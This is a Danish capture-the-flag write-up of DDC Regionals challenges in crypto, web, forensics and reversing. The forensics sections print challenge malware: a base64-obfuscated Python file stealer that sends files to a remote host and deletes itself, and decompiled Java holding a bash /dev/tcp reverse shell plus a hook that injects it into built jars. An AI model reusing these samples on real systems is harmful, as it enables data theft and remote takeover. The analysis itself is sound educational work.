---
title: DDC Regionals
date: 2025-04-06 19:52:00 +0100
categories: [Write-up, DDC Regionals ]
tags: [ddc,rev, Beginner, forensics, crypto, binary]     # TAG names should always be lowercase
---


# DDC Regionals
Jeg kvalificerede mig for 3-4. år i træk til regionals. Denne gang har jeg løst nok opgaver til jeg synes et write-up er justificeret. 


## Beginner

### Enigma_crack
Challenge beskrivelse: 
Du har netop modtaget en kritisk krypteret besked fra en vintage Enigma-maskine - en relikvie fra Anden Verdenskrigs kryptografi, der engang beskyttede de mest følsomme meddelelser fra aksemagterne. Efterretninger tyder på, at denne besked indeholder navnet på en strategisk lokation, der er afgørende for en igangværende kontraspionageoperation.

Din mission: Bryd gennem Enigmas legendariske kryptering og afslør det skjulte bynavn.
Vedhæftet var en zip-fil med et python script og en txt fil.
Det givne python script: 
```python
#!/usr/bin/env python
# Install the engima machine python package!
# pip install py-enigma
from enigma.machine import EnigmaMachine

machine = EnigmaMachine.from_key_sheet(
    rotors='II III I', 
    reflector='B',      
    ring_settings='1 1 1',  
    plugboard_settings='AV BS CG DL FU HZ IN KM OW RX'  
)

# Message to be decrypted
plaintext = "" # Input here the flag
bracket_1 = "{"
bracket_2 = "}"

ciphertext = machine.process_text(plaintext)
print(f'Decrypted Flag: DDC{bracket_1}{ciphertext}_0{bracket_2}')
```
og tekstfilen: 
```
THE ENCRYPTED FLAG IS ONE OF THE FOLLOWING:
BSGRJNDS
ZQKRQTZWEFH
UJHOB
```
Der er altså allerede lavet en "decrypt" funktion. Jeg prøvede blot de 3 givne flag, og fik "UJHOB" til at give flaget: DDC{PARIS_0}

### ExploreCPH
Challenge beskrivelse: En klog hacker har indlejret deres signatur på en rejsebureau-hjemmeside i København. 
Du skal finde denne signatur og opdage hackerens navn. Hints: Signaturen er i kildekoden

Vedhæftet var en zip-fil med en .html, hvor der i bunden af kildekoden var en kommentar der gav flaget: DDC{J0hnD03}

### Bobbys tabte flag
Drillenissen har gemt lille Bobby’s flag væk i en eller anden mappe, kan du hjælpe Bobby med at finde det igen?
http://drillenissen.fire

Når man først tilgår siden bliver man mødt med dette: 

![Alt Text]({{ '/assets/img/bobby1.png' | absolute_url }})

Jeg prøvede dernæst at trykke på dansk noter: 

![Alt Text]({{ '/assets/img/bobby2_5.png' | absolute_url }})

Dernæst prøvede jeg /privat

![Alt Text]({{ '/assets/img/bobby2.png' | absolute_url }})

Og til sidst prøvede jeg url'en http://drillenissen.fire/../hoejt_skab/flag.html som viste dette: 
![Alt Text]({{ '/assets/img/bobby3.png' | absolute_url }})

Jeg fandt flaget: DDC{Du_F4ndt_80bby_s_Fl4g}


### Flashback Maskinen
Kan du finde bloggen og finde ud af hvad Thea lavede i Alanya?
http://flashbackmaskinen.hkn

Når man først tilgår siden bliver man mødt med dette: 
![Alt Text]({{ '/assets/img/flashback_maskinen.png' | absolute_url }})

Jeg brugte overraskende lang tid på at gætte diverse blog navne, da jeg til sidst bare prøvede den givne i eksemplet: StilOgSmag.hkn, som viste sig at være bloggen. 
Der var et par blog posts om Alanya, dog fandt jeg et der viste denne Gucci taske: 

![Alt Text]({{ '/assets/img/flashback_maskinen_2.png' | absolute_url }})

Dertil fandt jeg flaget: DDC{M3get_43gt3_Fucci}


### #FAKENEWS
Vi er faldet over en X tråd mellem Musk og Trump, hvor vi mistænker Trump for at dele information, men hvad er det for en hemmelighed Trump deler?

![Alt Text]({{ '/assets/img/fakenews.jpg' | absolute_url }})

Substitutionsciffer opgaver er altid irriterende. Jeg prøvede først at få AI til at omskrive emojis fra billedet, dog var det så sløret at jeg måtte opgive. 
Jeg brugte dernæst mine Paint evner til langsomt at dekode emojis. Jeg startede med navnene, som gav de mest brugte vokaler, og arbejdede mig dernæst bare metodisk igennem.
Det tog lidt tid men jeg endte med at gennemskue at flaget indeholdt leet kode, og derfor manglede jeg noget. 

![Alt Text]({{ '/assets/img/substitution.jpg' | absolute_url }})

Dette endte med at give følgende samtale: 
Elon musk:
Donald jeg ved du har adgang til mange hemmeligheder noget sjovt du kan dele?

Donald Trump:
Elon du ville ikke tro halvdelen af det jeg ved nogle ting er meget hemmelige 

Elon musk:
kom nu, bare en ting. Noget kryptisk noget kan de klogeste kan forstå

okay  her er noget for dem, der virkelig tænker:
ddc{musk_f0r_pr3s1d3n7}

interessant mon nogen kan finde ud af, hvad det betyder? x c t f   x h a c k t h e p l a n e t

Samt flaget: DDC{musk_f0r_pr3s1d3n7}

## Cryptography

## Forensics 
### The right light
Challenge beskrivelse:
Vi har lige fanget den berømte Dott, også kendt som Dennis overloadning the internet. 
Vi mangler bare det sidste bevis for at kunne anholde ham. 
Vi har fundet et screenshot fra hans bank, men vi kan ikke rigtigt finde noget som vi kan bruge. 
Nogle siger at man bare skal se det i det rette lys. Kan du hjælpe os med at finde det sidste bevis?

Dertil er der givet en zip-fil med en .png fil.
![Alt Text]({{ '/assets/img/The_right_light.png' | absolute_url }})

Jeg startede med at køre exiftool på billedet som ikke rigtig gav mig noget interessant. Dernæst smed jeg billedet ind i Cyberchef og prøvede lidt tilfældigt bit plane, og fik til sidst dette billede: 
![Alt Text]({{ '/assets/img/The_right_light_bitplane3.png' | absolute_url }})
Som til sidst gav mig flaget: DDC{how_did_you_find_this}

### sysmon-spectacle
Challenge beskrivelse:
Der er opstået en sikkerhedshændelse på en af SagaLabs' arbejdsstationer. 
En af administratorerne blev overrasket over at finde en mærkelig eksekverbar fil på serveren, og værten genererede usædvanlig trafik til en fremmed IP-adresse.
SagaLabs' sikkerhedsteam har formået at indsamle nogle Sysmon-logs, som er blevet genereret på maskinen, men de skal bruge din hjælp til at fortolke dem og afdække detaljerne omkring hændelsen.

Vedhæftet var der en zip-fil indeholdende en .evtx fil.
Jeg havde ikke prøvet at håndtere sådanne event-filer før, og brugte lidt tid på at research det bedste værktøj (som viste sig at være fuldstændig ligegyldigt), men endte med at bruge Sysmonview. Dette gjorde jeg ved at bruge Windows' native event log viewer og eksporterede det til en .xml fil som sysmonview dertil kan håndtere. 

Efter at have gennemgået filerne fandt jeg denne:
![Alt Text]({{ '/assets/img/sysmon-view.png' | absolute_url }})
Der bliver kaldt til en meget mistænksom url. Jeg brugte lidt tid på at komme videre herfra, indtil det gik op for mig at sub-url'en lidt ligner en base64 string. 
Jeg dekodede denne i cyberchef og fik flaget: DDC{5Y5M0N154W350M3WUHU}

### NitroGenerator
I downloaded a downloaded a script that was supposed to give me free Discord Nitro codes. But when I ran it, it suddenly disappeared. 
I suspect it was malicious. Can you help me find out what it did?

Dertil var der givet en zip-fil med en .pcap fil. Jeg åbnede denne i Wireshark og søgte på teksten "nitro" i netværkspakkedetaljerne og fandt dette i en af HTTP pakkerne:
```python
import time, sys, base64, threading;threading.Thread(target=lambda x: exec(base64.b64decode("aW1wb3J0IG9zCgpkZWYgc3RlYWwocGF0aCk6CiBpbXBvcnQgc29ja2V0CiBkZWYgeG9yKGRhdGEsIGtleSk6CiAgcmV0dXJuIGJ5dGVzKFthIF4gYiBmb3IgYSwgYiBpbiB6aXAoZGF0YSwga2V5ICogKGxlbihkYXRhKSAvLyBsZW4oa2V5KSArIDEpKV0pCiB3aXRoIG9wZW4ocGF0aCwgInJiIikgYXMgZjoKICBjb250ZW50ID0gZi5yZWFkKCkKIGVuY3J5cHRlZCA9IHhvcihjb250ZW50LCBiIjZhNTI2NWUyNjBmN2JlZDUwMDY5M2IwZDIxYTA1Y2QyIikKIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiBzLmNvbm5lY3QoKCJuaXRyby1nZW5lcmF0b3IuaGtuIiwgNTkwMDApKQogcy5zZW5kYWxsKGVuY3J5cHRlZCkKIHMuY2xvc2UoKQogb3MucmVtb3ZlKHBhdGgpCgpmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsaygiLyIpOgogZm9yIGZpbGUgaW4gZmlsZXM6CiAgcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogIGlmIG9zLnBhdGguaXNmaWxlKHBhdGgpIGFuZCBmaWxlID09ICJmbGFnLnR4dCI6CiAgIHRyeTpzdGVhbChwYXRoKQogICBleGNlcHQ6cGFzcwoKcHJpbnQoIlxuRmFpbGVkIHRvIGdlbmVyYXRlIG5pdHJvIGNvZGVzLiIpCm9zLnJlbW92ZShfX2ZpbGVfXykKb3MuX2V4aXQoKSBpZiBvcy5uYW1lID09ICJudCIgZWxzZSBvcy5raWxsKG9zLmdldHBpZCgpLCA5KQ==")), args=(0,)).start()


chars = "\\|/-"

while True:
    for char in chars:
        sys.stdout.write('\r' + "Generating Nitro Codes... " + char)
        sys.stdout.flush()
        time.sleep(0.2)
```
Jeg dekodede dernæst base64 teksten og fik en ny python kode: 
```python
import os

def steal(path):
 import socket
 def xor(data, key):
  return bytes([a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1))])
 with open(path, "rb") as f:
  content = f.read()
 encrypted = xor(content, b"6a5265e260f7bed500693b0d21a05cd2")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("nitro-generator.hkn", 59000))
 s.sendall(encrypted)
 s.close()
 os.remove(path)

for root, dirs, files in os.walk("/"):
 for file in files:
  path = os.path.join(root, file)
  if os.path.isfile(path) and file == "flag.txt":
   try:steal(path)
   except:pass

print("\nFailed to generate nitro codes.")
os.remove(__file__)
os._exit() if os.name == "nt" else os.kill(os.getpid(), 9)
```
Python koden leder efter en tekst fil "flag.txt" og krypterer indholdet med xor funktionen ved brugen af den givne key "6a5265e260f7bed500693b0d21a05cd2"
Jeg ledte dernæst efter den netværkspakke i Wireshark ved at sortere efter porten "59000". Jeg fandt dernæst én TCP pakke som indeholdt data i form af en hex-stream. Jeg eksporterede denne som en .bin fil. 

Jeg skrev dernæst dette script for de dekryptere filen.
```python
def xor(data, key):
    return bytes([a ^ b for a, b in zip(data, key * ((len(data) // len(key)) + 1))])

with open("encrypted_flag.bin", "rb") as f:
    encrypted = f.read()

key = b"6a5265e260f7bed500693b0d21a05cd2"
decrypted = xor(encrypted, key)
print(decrypted.decode(errors="replace"))
```
Jeg fik dertil flaget: DDC{Ev3n_Cl34r_c0d3_c4n_b3_M4l1c10u5}


### SystemReaper
Challenge beskrivelse:
Look at this tool! You can hack everything with it! What? You think it's actually a malware?
No! Impossible! If you don't believe me, check its source code and compile it yourself!

Dertil var der givet en zip-fil med et java-projekt i. 
Jeg ledte alle main .java filerne igennem men uden held. Dog lagde jeg mærke til de alle kaldte på funktioner fra en package kaldt fr.crazycat256.systemreaper.
Dette ledte mig videre til wrapper filerne, som indeholdt en mappe kaldt "backdoor" som tyder på noget ondsindet. 

Jeg smed wrapperen ind i en online java decompiler og fandt disse to .class filer. 
Entrypoint.class:
```java
package fr.crazycat256.systemreaper.backdoor;

public class EntryPoint {
   public static final String ENTRYPOINT_CLASS = "{CLASS_NAME_PLACEHOLDER}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!";

   public static void main(String[] args) throws Exception {
      maliciousFunction();
      String mainClass = "{CLASS_NAME_PLACEHOLDER}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!".replace("!", "");
      Class<?> clazz = Class.forName(mainClass);
      clazz.getMethod("main", String[].class).invoke((Object)null, args);
   }

   private static void maliciousFunction() {
      try {
         String[] cmd = new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/systemreaper.hkn/6666 0>&1"};
         (new ProcessBuilder(cmd)).redirectErrorStream(true).start();
      } catch (Throwable var1) {
      }

   }
}
```
samt hook.java: 
```java
 package fr.crazycat256.systemreaper.backdoor;

import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Iterator;
import java.util.jar.Attributes;
import java.util.jar.Manifest;
import java.util.jar.Attributes.Name;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

public class Hook {
   private static final String PLACEHOLDER = "{CLASS_NAME_PLACEHOLDER}";

   public static void onLaunchWrapper(String[] args) {
      if (args.length != 0) {
         iAmNotHere(args[0]);
         if (!args[0].matches("help|tasks|properties|projects|init|wrapper")) {
            Runtime.getRuntime().addShutdownHook(new Thread(Hook::modifyBuilds));
         }

      }
   }

   public static void modifyBuilds() {
      try {
         String className = EntryPoint.class.getName().replace('.', '/');
         InputStream inputStream = EntryPoint.class.getResourceAsStream("/" + className + ".class");

         byte[] classBytes;
         try {
            classBytes = inputStream.readAllBytes();
         } catch (Throwable var10) {
            if (inputStream != null) {
               try {
                  inputStream.close();
               } catch (Throwable var8) {
                  var10.addSuppressed(var8);
               }
            }

            throw var10;
         }

         if (inputStream != null) {
            inputStream.close();
         }

         Path absoluteWrapperDir = Paths.get(EntryPoint.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent();
         Path targetDirectory = absoluteWrapperDir.getParent().getParent().resolve("build/libs").normalize();
         DirectoryStream stream = Files.newDirectoryStream(targetDirectory, "*.jar");

         try {
            Iterator var5 = stream.iterator();

            while(var5.hasNext()) {
               Path jarFilePath = (Path)var5.next();
               hookJar(jarFilePath.toString(), className, classBytes);
            }
         } catch (Throwable var9) {
            if (stream != null) {
               try {
                  stream.close();
               } catch (Throwable var7) {
                  var9.addSuppressed(var7);
               }
            }

            throw var9;
         }

         if (stream != null) {
            stream.close();
         }
      } catch (Throwable var11) {
      }

   }

   public static void hookJar(String jarFilePath, String newEntryPoint, byte[] classToAdd) throws IOException {
      Path jarPath = Paths.get(jarFilePath);
      byte[] originalJarBytes = Files.readAllBytes(jarPath);
      ByteArrayOutputStream jarOutputStream = new ByteArrayOutputStream();
      ZipInputStream zis = new ZipInputStream(new ByteArrayInputStream(originalJarBytes));

      try {
         ZipOutputStream zos = new ZipOutputStream(jarOutputStream);

         try {
            Manifest manifest = null;

            ZipEntry entry;
            while((entry = zis.getNextEntry()) != null) {
               if (entry.getName().equals("META-INF/MANIFEST.MF")) {
                  manifest = new Manifest(zis);
                  Attributes attrs = manifest.getMainAttributes();
                  String realEntryPoint = attrs.getValue(Name.MAIN_CLASS.toString());
                  classToAdd = replaceEntryPointClassName(classToAdd, realEntryPoint);
                  attrs.putValue(Name.MAIN_CLASS.toString(), newEntryPoint);
               } else {
                  zos.putNextEntry(new ZipEntry(entry.getName()));
                  zis.transferTo(zos);
                  zos.closeEntry();
               }
            }

            if (manifest != null) {
               zos.putNextEntry(new ZipEntry("META-INF/MANIFEST.MF"));
               manifest.write(new BufferedOutputStream(zos));
               zos.closeEntry();
            }

            String classEntryName = newEntryPoint.replace('.', '/') + ".class";
            zos.putNextEntry(new ZipEntry(classEntryName));
            zos.write(classToAdd);
            zos.closeEntry();
         } catch (Throwable var14) {
            try {
               zos.close();
            } catch (Throwable var13) {
               var14.addSuppressed(var13);
            }

            throw var14;
         }

         zos.close();
      } catch (Throwable var15) {
         try {
            zis.close();
         } catch (Throwable var12) {
            var15.addSuppressed(var12);
         }

         throw var15;
      }

      zis.close();
      Files.write(jarPath, jarOutputStream.toByteArray(), new OpenOption[]{StandardOpenOption.TRUNCATE_EXISTING});
   }

   public static byte[] replaceEntryPointClassName(byte[] classBytes, String entryPointClass) {
      classBytes = (byte[])classBytes.clone();
      int placeholderIndex = -1;

      int i;
      label38:
      for(i = 0; i < classBytes.length; ++i) {
         if (classBytes[i] == "{CLASS_NAME_PLACEHOLDER}".charAt(0)) {
            for(int j = 1; j < "{CLASS_NAME_PLACEHOLDER}".length(); ++j) {
               if (classBytes[i + j] != "{CLASS_NAME_PLACEHOLDER}".charAt(j)) {
                  continue label38;
               }
            }

            placeholderIndex = i;
            break;
         }
      }

      if (placeholderIndex != -1) {
         for(i = 0; i < entryPointClass.length(); ++i) {
            classBytes[placeholderIndex + i] = (byte)entryPointClass.charAt(i);
         }
      }

      return classBytes;
   }

   private static void iAmNotHere(String arg) {
      if (arg.equals("flag")) {
         byte[] b = new byte[]{63, 7, 15, 58, 17, 96, 0, 45, 117, 63, 118, 57, 37, 32, 30, 52, 116, 60, 39, 19, 3, 55, 102, 25, 23, 112, 19, 54, 33, 103, 47, 62, 114, 63, 112, 34};
         System.out.println(xor(new String(b), "{CLASS_NAME_PLACEHOLDER}"));
         System.exit(0);
      }
   }

   private static String xor(String s, String key) {
      StringBuilder sb = new StringBuilder();

      for(int i = 0; i < s.length(); ++i) {
         sb.append((char)(s.charAt(i) ^ key.charAt(i % key.length())));
      }

      return sb.toString();
   }
}
```
I Entrypoint.java bliver bagdøren eksekveret med en reverse shell, men ingen flag :/
I hook.java er der dog en funktion kaldt "iAmNotHere" Der tager en string og laver noget XOR. 

Jeg fik dernæst ChatGPT til at konvertere den funktion i et python script: 
```python
def xor_decrypt(data, key):
    return ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(data))

encrypted = [
    63, 7, 15, 58, 17, 96, 0, 45, 117, 63, 118, 57, 37, 32, 30, 52,
    116, 60, 39, 19, 3, 55, 102, 25, 23, 112, 19, 54, 33, 103, 47, 62,
    114, 63, 112, 34
]

key = "{CLASS_NAME_PLACEHOLDER}"

decrypted = xor_decrypt(encrypted, key)
print(decrypted)
```
Det gav flaget: DDC{B3_c4r3ful_w1th_Gr4dl3_wr4pp3r5}

## Binary

### StuckAt99
Challenge beskrivelse: 
Alle disse $💢%💀@! opdateringer bliver ved med at sidde fast! 
Det er så irriterende!!! Hvis bare jeg selv kunne få fat i koden, så kunne jeg endelig få dette program til at køre.

Dertil er der givet en zip-fil der indeholder en .exe fil.

Jeg kørte først file på filen
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ file StuckAt99.exe 
StuckAt99.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```
Da det er en .net fil brugte jeg blot IlSPy til at dissassemble filen.
![Alt Text]({{ '/assets/img/IlSpy_btn99.png' | absolute_url }})
Jeg fandt disse 2 funktioner. Den ene indeholder et array med karakterer der ligner et spredt flag, samt den anden der kalder specifikke elemnter i array'et. 

Da den kalder det nulte element 2 gange, som er to D'er, gik jeg udfra jeg havde ret i min deduktion. Det kunne nemt gøres manuelt, men jeg skrev hurtigt et python script for at automatisere. 

```python
karakter_array = [
		'D', 'C', '{', '}', 'Y', 'b', '9', '_', 'H', 'j',
		'X', '4', 'L', 'f', '2', 'u', 'V', 'z', 's', 'M',
		'K', 'D', 'P', 't', 'n', 'F', '1', '0', 'r', 'a',
		'z', 'f', '1', 'n', 'e', 'l', 'H', 'A', 'S', 'i',
		't', '_', 'm', '4', 'n', 'u', 'a', 'l', 'l', 'y',
		'G', 'o', 'd', 'b', 'l', 'e', 'C', '6', 'p', 'Y',
		'd', 'I', 'w', 'q', 'b', 'M', 'n', 'J', '3', 'z',
		'X', 's', 'F', 'r', 't', 'C', 'g', 'Q', '1', 'L',
		'8', 'N', 'e', '_', 'u', 'T', 's', '0', 'y', 'k',
		'f', 'P', 'h', 'V', 'c', 'W', 'j', '2', 'l', 'B',
		'7', 'r', 'O', 'X', 'e', '9', 'S', 'a', 'M', 'T',
		'n', '!'] # Array af mulige flagskombinationer

flag_fragments = ['0', '0', '1', '2', '31', '32', '33', '34', '41', '41', '42', '43', '44', '45', '46', '47', '48', '49', '3'] #Hver karakters indeks nummer i karakter_array 

for i in range(len(flag_fragments)): 
    indeks = int(flag_fragments[i])
    print(karakter_array[indeks],end="")
```
hvilket gav mig flaget: DDC{f1ne__m4nually}


## Reverse engineering

### Challenge: WizardTrial
Challenge beskrivelse: 
Velkommen lærling til hackingverdenen. Din første opgave er at lære den oplåsende charme. Du har fået en liste over mulige adgangskoder, men den store troldmand har beskyttet flaget med en mystisk hash 🔒. Held og lykke, unge troldmand! ✨🔮 nc wizard-trial.hkn 1337 

reveng_wizardtraining.zip 

I zip-filen er der to filer: 
chall.java
wordlist.txt


chall.java indeholder koden: 
```java 
import java.io.*;
import java.nio.file.*;
import java.util.Scanner;

public class chall {
    
    public static String readFlag() {
        try {
            return new String(Files.readAllBytes(Paths.get("flag.txt")));
        } catch (IOException e) {
            e.printStackTrace();
            return "";
        }
    }

    public static String readPwd() {
        try {
            return new String(Files.readAllBytes(Paths.get("pwd.txt")));
        } catch (IOException e) {
            e.printStackTrace();
            return "";
        }
    }

// // // // // // // // // // // 
// ::CHALLENGE STARTS HERE:: // 
// // // // // // // // // // 

    public static String magic(String input) {
        long j = 1337;
        int k = 57 - 30 + 3 + 1;  
        int l = 222/6;  
        
        for (int i = 0; i < input.length(); i++) {
            j *= (input.charAt(i) + k) * l;
            j %= 1_000_000_007;
        }
        
        j = ((j << 16) | (j >> 48)) & 0xFFFFFFFFFFFFL;
        return Long.toHexString(j);
    }


    public static boolean check(String password, String storedHash) {
        String hashedPassword = magic(password);
        return hashedPassword.equals(storedHash);
    }

    public static void main(String[] args) {

        String password = readPwd();
        String storedHash = magic(password);
        

        Scanner scanner = new Scanner(System.in);
        System.out.println("***ID");
        System.out.println("**" + storedHash);
        System.out.println("***ENTER PASSWORD:");
        String userInput = scanner.nextLine();
        
        if (check(userInput, storedHash)) {
            System.out.println("***CRACKED: " + readFlag());
        } else {
            System.out.println("***WRONG***.");
        }
    }
}
```

### sledgehammer 

Challenge beskrivelse: 

Hej! Jeg hørte du er en mester. Kan du svare rigtigt på alle spørgsmålene?


Først tjekkede jeg filtypen. 
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ file sledgehammer 
sledgehammer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a29f78c01db053a982d5d929bde9fb86d0b918e3, for GNU/Linux 3.2.0, not stripped
```
Dernæst prøvede jeg at eksekvere filen. 
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ./sledgehammer
  Network intrusion
```

Dette gav mig ikke så meget at gå videre med. Jeg loadede dernæst filen op i Ghidra og kørte auto-analyse.

![Alt Text]({{ '/assets/img/ghidra-sledgehammer.png' | absolute_url }})

Dernæst tjekkede jeg for strings, og sorterede efter størrelsen på addressen. 

![Alt Text]({{ '/assets/img/Ghidra-sledgehammer-strings.png' | absolute_url }})

Det ligner svaret bliver givet efter spørgsmålet. Jeg prøvede dernæst at give programmet "Detect the threat"

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ./sledgehammer
  Network intrusion
Detect the threat
  Awesome!
```

Det virkede. Jeg gennemgik manuelt resten og fik flaget som endte med at være første bogstav for hvert svar. 

Dog gav dette mig chancen for at bruge pwntools biblioteket i Python for at automatisere det. Programmet indeholder et array navngivet flag, hvor variablen local_88 bliver brugt som indeksering. Dernæst bliver der brugt lidt bit manipulation. 

Det vil sige jeg blot kan automatisere denne process. Dette implementerede jeg med dette script: 
```python
from pwn import *

elf = ELF("./sledgehammer")
base_address = elf.address  

flag = bytearray.fromhex("1e5b5c6145321b301d165f142e2b23211329070b4a243615") #flag array fra ghidra



for i in range(len(flag)): 
	ans_offset = 0x104084-0x100000 #offset for "pairs" minus ghidras standard offset
	index_val = (flag[i]*0x25)%0x61 #ivar1 variablen i Ghidra
	target_address = index_val*200+ans_offset #kalkulerer adressen for svaret
	data = elf.read(target_address, 100) #læser 100 bytes på adressen
	data = data.split(b'\x00')[0] #fjerner alle null bits
	print(data.decode("utf-8")[0],end="") #printer kun det første bogstav
```
Hvis dette script eksekveres får man følgende output:
```bash 
┌──(kali㉿kali)-[~/Desktop]
└─$ python slegdehammer_rev.py
[*] '/home/kali/Desktop/sledgehammer'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
DDC{SLEDGEHAMMERISMYJAM} 
```

## Misc 
